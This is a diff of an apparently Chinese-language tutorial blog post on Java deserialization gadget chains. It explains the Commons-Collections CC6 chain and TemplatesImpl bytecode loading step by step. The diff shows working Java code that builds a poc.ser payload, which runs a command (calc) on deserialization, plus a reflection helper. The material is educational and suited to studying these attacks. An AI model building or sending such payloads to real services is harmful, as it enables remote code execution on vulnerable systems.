@@ -30,7 +30,6 @@ tags:
 攻击者发送：序列化后的对象图描述（只有类名 + 字段名 + 字段值）
 目标执行：readObject() 用【目标自己 classpath 上的类】把这些对象 new 出来
 ```
-
 真正"执行代码"的是目标上已有的类。攻击者只做了一件事：**设计这张对象图，让"还原对象的过程"被迫调用一串方法，最终落进一个危险方法。**
 
 > 类比：payload 不是炸弹，而是"多米诺骨牌怎么摆"的说明书。牌是目标上现成的类，摆法由攻击者决定，`readObject()` 就是推倒第一张牌的那只手。
@@ -76,7 +75,6 @@ InvokerTransformer t = new InvokerTransformer(
 
 t.transform(Runtime.getRuntime());   // 等价于 Runtime.getRuntime().exec("calc")
 ```
-
 **它就是整条链的"引擎"**：任何一次 `transform(x)` 调用，都会变成"在 x 上反射调用任意方法"。这一步把"无害的 transform"和"危险的方法调用"焊在了一起。
 
 ---
@@ -101,8 +99,9 @@ Transformer[] transformers = new Transformer[]{
 ChainedTransformer chain = new ChainedTransformer(transformers);
 chain.transform(null);   // 依次执行 1→2→3→4 → Runtime.getRuntime().exec("calc")
 ```
-
 > 为什么不直接 `new InvokerTransformer("exec", ...)` 一步到位？因为 `Runtime` 构造方法是私有的，必须先反射 `getMethod("getRuntime")` 拿到方法、再 `invoke` 得到实例，最后才能 `exec`。这就是 payload 里常见"getMethod → invoke → exec"三段式的原因。
+
+![image-20260810092032949](./2026-07-24-Java反序列化Gadget链入门.assets/image-20260810092032949.png)
 
 到这里，"有 `transform()` 调用 → 就执行命令"已经成立。现在的问题是：**反序列化时，谁会去调 `transform()`？**
 
@@ -116,7 +115,6 @@ chain.transform(null);   // 依次执行 1→2→3→4 → Runtime.getRuntime().
 Map lazyMap = LazyMap.decorate(new HashMap(), chain);   // factory = chain
 lazyMap.get("任何不存在的key");   // → chain.transform("...") → RCE！
 ```
-
 现在链条推进到：`LazyMap.get(key) → factory.transform(key) → ... → exec`。
 
 ---
@@ -131,7 +129,6 @@ lazyMap.get("任何不存在的key");   // → chain.transform("...") → RCE！
 TiedMapEntry entry = new TiedMapEntry(lazyMap, "key");
 entry.hashCode();   // → lazyMap.get("key") → chain.transform → RCE
 ```
-
 而 `HashMap.readObject()` 会对每个 key 调 `hashCode()`（见第二节）：
 
 ```java
@@ -141,7 +138,6 @@ for (int i = 0; i < mappings; i++) {
     putVal(hash(key), key, value, false, false);   // hash(key) 会调 key.hashCode()
 }
 ```
-
 所以让 `HashMap` 的 key 是那个 `TiedMapEntry`，反序列化就自动触发整条链。
 
 ---
@@ -159,7 +155,6 @@ HashMap.readObject()                          ← 入口（集合固有行为）
   → InvokerTransformer.transform() × 3        ← getMethod → invoke → exec
   → Runtime.getRuntime().exec("calc")         ← Sink：RCE
 ```
-
 ### 8.1 先手工验证：证明链本身是通的
 
 ```java
@@ -180,10 +175,20 @@ Map lazyMap = LazyMap.decorate(new HashMap(), chain);
 TiedMapEntry entry = new TiedMapEntry(lazyMap, "key");
 entry.hashCode();   // ← 触发点，等价于整条链
 ```
-
 > 这一步很重要：**先证明"手工触发能通"，再谈反序列化触发**。把整条链拆成"触发点方法调用" + "触发源是谁"，是理解所有链的通用方法。
 
 ### 8.2 再封装成真正的反序列化 payload
+
+> ⚠️ **先抄这个辅助方法**：下面主代码用到的 `setFieldValue` 是**自定义方法**，不是 JDK 也不是 commons-collections 提供的，需要你自己复制进类里——漏掉它编译会报"找不到符号"。它依赖 `import java.lang.reflect.Field;`，且方法抛 `Exception`，调用它的 `main` 要声明 `throws Exception`。
+
+```java
+// 辅助方法：反射修改 ChainedTransformer 的私有字段 iTransformers
+public static void setFieldValue(Object obj, String name, Object value) throws Exception {
+    Field f = obj.getClass().getDeclaredField(name);
+    f.setAccessible(true);
+    f.set(obj, value);
+}
+```
 
 ```java
 // 两个关键细节：
@@ -206,21 +211,11 @@ setFieldValue(chain, "iTransformers", transformers);
 ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("poc.ser"));
 oos.writeObject(expMap);
 ```
-
 ```java
 // 目标端：一句 readObject 就 RCE
 ObjectInputStream ois = new ObjectInputStream(new FileInputStream("poc.ser"));
 ois.readObject();   // ← 弹出计算器
 ```
-
-```java
-public static void setFieldValue(Object obj, String name, Object value) throws Exception {
-    Field f = obj.getClass().getDeclaredField(name);
-    f.setAccessible(true);
-    f.set(obj, value);
-}
-```
-
 > 这段代码就是 ysoserial 里 `CommonsCollections6` 的手写简化版。**理解它的过程 = 理解所有"基于集合的 gadget 链"**。LazyMap/TiedMapEntry/ChainedTransformer 全部来自 `commons-collections 3.2.1`（Shiro 1.2.4 等老框架自带）。
 
 ---
@@ -230,6 +225,7 @@ public static void setFieldValue(Object obj, String name, Object value) throws E
 CC6 依赖 `commons-collections`。而 `TemplatesImpl` 是 **JDK 自带**的，并且能干更狠的事——**加载攻击者提供的任意字节码**，不要求目标 classpath 上存在这个类：
 
 ```java
+// setFieldValue 同 8.2 的自定义辅助方法（需自己实现，且 import java.lang.reflect.Field）
 TemplatesImpl templates = new TemplatesImpl();
 setFieldValue(templates, "_bytecodes", new byte[][]{恶意类的字节码});
 setFieldValue(templates, "_name", "Evil");
@@ -240,7 +236,6 @@ templates.newTransformer();
 // → 实例化恶意类（须继承 AbstractTranslet）
 // → 恶意类 static{} / 构造方法执行 → RCE
 ```
-
 在链里它通常由 `InstantiateTransformer` 触发：
 
 ```
@@ -249,7 +244,6 @@ InstantiateTransformer(TrAXFilter.class, [Templates.class], [templates])
   → TrAXFilter 构造方法里调 templates.newTransformer()   ← 触发点
   → defineClass 加载字节码 → 恶意类实例化 → RCE
 ```
-
 **为什么它重要**：
 1. **JDK 自带**，不依赖第三方库，通杀面大；
 2. **能加载任意字节码** → [《反序列化与 JNDI 无文件注入内存马》]({% post_url 2026-07-28-反序列化与JNDI无文件注入内存马 %}) 里把"注入类"送进 JVM，就是靠它（Shiro 的 CC2 / CC3 / CommonsBeanutils1 都用 TemplatesImpl）。
